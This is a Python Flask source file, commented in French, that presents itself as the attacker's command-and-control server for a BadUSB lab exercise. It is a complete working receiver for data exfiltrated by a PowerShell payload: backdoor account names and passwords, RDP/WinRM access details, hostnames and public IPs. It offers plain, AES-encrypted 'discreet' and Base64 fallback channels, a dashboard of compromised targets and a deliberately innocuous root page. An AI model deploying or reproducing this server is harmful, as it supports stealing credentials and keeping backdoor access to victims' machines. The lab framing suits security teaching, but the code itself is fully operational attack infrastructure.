#!/usr/bin/env python3
"""
server.py – Serveur C2 (Command & Control) de l'attaquant
Partie 1 – TP BadUSB Attack

Rôle :
  - Reçoit les données exfiltrées par le payload (credentials RDP/WinRM,
    IP publique, informations système).
  - Stocke les entrées reçues dans un fichier JSON horodaté.
  - Expose une interface console (via /status) pour visualiser les cibles.

Utilisation :
  1. Installer les dépendances : pip install -r requirements.txt
  2. Lancer le serveur          : python server.py [--host 0.0.0.0] [--port 8080] [--key <hex32>]
  3. Configurer le payload      : remplacer ATTACKER_IP dans payload.ps1
     par l'adresse IP publique de cette machine.

Endpoints :
  POST /collect      – reçoit le JSON exfiltré par le payload (clair)
  POST /enc          – reçoit les données chiffrées AES-256-GCM (canal discret)
  GET  /b64?d=<b64>  – reçoit les données en Base64 (méthode de repli)
  GET  /status       – affiche toutes les cibles collectées (HTML)

Chiffrement AES-256-GCM (/enc) :
  Format du corps : <nonce_12B><tag_16B><ciphertext>  (binaire brut, Content-Type: application/octet-stream)
  La clé symétrique est fournie via --key (32 octets hex) ou la variable
  d'environnement C2_AES_KEY.  Générateur : python -c "import secrets; print(secrets.token_hex(32))"
"""

import argparse
import base64
import json
import logging
import os
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, jsonify, render_template_string, request

# ── Configuration ────────────────────────────────────────────

LOG_DIR     = Path(__file__).parent / "logs"
DATA_FILE   = LOG_DIR / "collected_targets.json"
LOG_FILE    = LOG_DIR / "server.log"

LOG_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(),
    ],
)
log = logging.getLogger(__name__)

app = Flask(__name__)

# Clé AES-256 (32 octets) – initialisée dans main() puis stockée ici
_aes_key: bytes | None = None


# ── Helpers ───────────────────────────────────────────────────

def load_targets() -> "list[dict]":
    """Charge la liste des cibles depuis le fichier JSON persistant."""
    if DATA_FILE.exists():
        try:
            with open(DATA_FILE, encoding="utf-8") as fh:
                return json.load(fh)
        except (json.JSONDecodeError, OSError):
            return []
    return []


def save_target(entry: dict) -> None:
    """Ajoute une nouvelle cible et persiste la liste."""
    targets = load_targets()

    # Horodatage serveur indépendant du client
    entry.setdefault("server_received", datetime.now(timezone.utc).isoformat())
    entry.setdefault("client_ip", request.remote_addr)

    targets.append(entry)
    with open(DATA_FILE, "w", encoding="utf-8") as fh:
        json.dump(targets, fh, indent=2, ensure_ascii=False)

    log.info(
        "Nouvelle cible : %s (%s) – user=%s  pass=%s  IP_pub=%s",
        entry.get("computer_name", "?"),
        entry.get("local_ip", "?"),
        entry.get("backdoor_user", "?"),
        entry.get("backdoor_pass", "?"),
        entry.get("public_ip", "?"),
    )


def _aes_decrypt(cipherblob: bytes) -> bytes:
    """
    Déchiffre un blob AES-256-GCM.
    Format attendu : nonce(12) || tag(16) || ciphertext
    Lève ValueError si le blob est trop court ou si l'authentification échoue.
    """
    if _aes_key is None:
        raise RuntimeError("Clé AES non configurée (utilisez --key ou C2_AES_KEY).")
    if len(cipherblob) < 28:  # 12 + 16 = minimum
        raise ValueError("Blob chiffré trop court.")
    try:
        from Crypto.Cipher import AES
    except ImportError as exc:
        raise RuntimeError("pycryptodome requis : pip install pycryptodome") from exc

    nonce      = cipherblob[:12]
    tag        = cipherblob[12:28]
    ciphertext = cipherblob[28:]

    cipher = AES.new(_aes_key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)


# ── Routes ────────────────────────────────────────────────────

@app.route("/collect", methods=["POST"])
def collect():
    """
    Reçoit les données exfiltrées en JSON brut (Content-Type: application/json).
    """
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            # Tentative de parse si le Content-Type n'est pas bien positionné
            data = json.loads(request.data.decode("utf-8", errors="replace"))

        save_target(data)
        return jsonify({"status": "ok"}), 200

    except Exception as exc:
        log.error("Erreur /collect : %s", exc)
        return jsonify({"status": "error", "detail": "invalid request"}), 400


@app.route("/enc", methods=["POST"])
def collect_encrypted():
    """
    Canal discret : données chiffrées AES-256-GCM.
    Corps : <nonce_12B><tag_16B><ciphertext>  (binaire brut).
    Nécessite que le serveur soit lancé avec --key <hex32>.
    """
    if _aes_key is None:
        log.warning("Requête /enc reçue mais aucune clé AES configurée.")
        return jsonify({"status": "error", "detail": "encryption not configured"}), 503

    try:
        plaintext = _aes_decrypt(request.data)
        data = json.loads(plaintext.decode("utf-8"))
        data["channel"] = "aes-256-gcm"
        save_target(data)
        return jsonify({"status": "ok"}), 200

    except Exception as exc:
        log.error("Erreur /enc : %s", exc)
        return jsonify({"status": "error", "detail": "decryption failed"}), 400


@app.route("/b64", methods=["GET"])
def collect_b64():
    """
    Méthode de repli : données encodées en Base64 dans le paramètre ?d=
    """
    encoded = request.args.get("d", "")
    if not encoded:
        return jsonify({"status": "error", "detail": "missing 'd' parameter"}), 400

    try:
        # Gestion du padding Base64 manquant
        padding = 4 - len(encoded) % 4
        if padding != 4:
            encoded += "=" * padding

        raw  = base64.b64decode(encoded).decode("utf-8")
        data = json.loads(raw)
        save_target(data)
        return jsonify({"status": "ok"}), 200

    except Exception as exc:
        log.error("Erreur /b64 : %s", exc)
        return jsonify({"status": "error", "detail": "invalid base64 data"}), 400


# ── Interface de visualisation ────────────────────────────────

STATUS_TEMPLATE = """
<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>C2 – Cibles collectées</title>
  <style>
    body  { font-family: monospace; background: #111; color: #0f0; margin: 2rem; }
    h1    { color: #f90; border-bottom: 1px solid #333; padding-bottom: .5rem; }
    table { border-collapse: collapse; width: 100%; margin-top: 1rem; }
    th    { background: #222; color: #f90; padding: .5rem; border: 1px solid #333; }
    td    { padding: .4rem .6rem; border: 1px solid #222; vertical-align: top; word-break: break-all; }
    tr:hover td { background: #1a1a1a; }
    .badge { background:#f90; color:#000; border-radius:3px; padding:0 4px; font-size:.75em; }
    .enc  { color: #0ff; font-size: .7em; }
  </style>
</head>
<body>
  <h1>🎯 Cibles collectées <span class="badge">{{ targets|length }}</span></h1>
  {% if targets %}
  <table>
    <tr>
      <th>#</th><th>Horodatage serveur</th><th>Hostname</th><th>Domaine</th>
      <th>OS</th><th>IP locale</th><th>IP publique</th>
      <th>Utilisateur backdoor</th><th>Mot de passe</th>
      <th>RDP</th><th>WinRM</th><th>Canal</th><th>IP client C2</th>
    </tr>
    {% for t in targets %}
    <tr>
      <td>{{ loop.index }}</td>
      <td>{{ t.get("server_received","?") }}</td>
      <td>{{ t.get("computer_name","?") }}</td>
      <td>{{ t.get("domain","?") }}</td>
      <td>{{ t.get("os_version","?") }}</td>
      <td>{{ t.get("local_ip","?") }}</td>
      <td>{{ t.get("public_ip","?") }}</td>
      <td><strong>{{ t.get("backdoor_user","?") }}</strong></td>
      <td><strong style="color:#ff4444">{{ t.get("backdoor_pass","?") }}</strong></td>
      <td>{{ t.get("rdp_port", 3389) }}</td>
      <td>{{ t.get("winrm_port", 5985) }}</td>
      <td><span class="enc">{{ t.get("channel","json") }}</span></td>
      <td>{{ t.get("client_ip","?") }}</td>
    </tr>
    {% endfor %}
  </table>
  {% else %}
  <p>Aucune cible reçue pour l'instant…</p>
  {% endif %}
</body>
</html>
"""


@app.route("/status", methods=["GET"])
def status():
    """Tableau de bord HTML affichant toutes les cibles."""
    targets = load_targets()
    return render_template_string(STATUS_TEMPLATE, targets=targets)


@app.route("/", methods=["GET"])
def index():
    """Racine neutre (ne révèle rien)."""
    return "OK", 200


# ── Point d'entrée ────────────────────────────────────────────

def main() -> None:
    global _aes_key

    parser = argparse.ArgumentParser(description="Serveur C2 BadUSB – TP pédagogique")
    parser.add_argument("--host", default="0.0.0.0",
                        help="Interface d'écoute (défaut : 0.0.0.0)")
    parser.add_argument("--port", type=int, default=8080,
                        help="Port d'écoute (défaut : 8080)")
    parser.add_argument("--debug", action="store_true",
                        help="Mode debug Flask")
    parser.add_argument(
        "--key",
        default=os.environ.get("C2_AES_KEY", ""),
        help=(
            "Clé AES-256 en hexadécimal (64 caractères hex = 32 octets). "
            "Peut aussi être fournie via la variable d'environnement C2_AES_KEY. "
            "Générateur : python -c \"import secrets; print(secrets.token_hex(32))\""
        ),
    )
    args = parser.parse_args()

    if args.key:
        try:
            key_bytes = bytes.fromhex(args.key)
            if len(key_bytes) != 32:
                parser.error("--key doit être exactement 32 octets (64 caractères hex).")
            _aes_key = key_bytes
            log.info("Canal AES-256-GCM activé (endpoint /enc).")
        except ValueError:
            parser.error("--key contient des caractères hexadécimaux invalides.")
    else:
        log.warning("Aucune clé AES configurée – endpoint /enc désactivé.")

    log.info("Serveur C2 démarré sur %s:%d", args.host, args.port)
    log.info("Tableau de bord : http://%s:%d/status", args.host, args.port)

    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == "__main__":
    main()
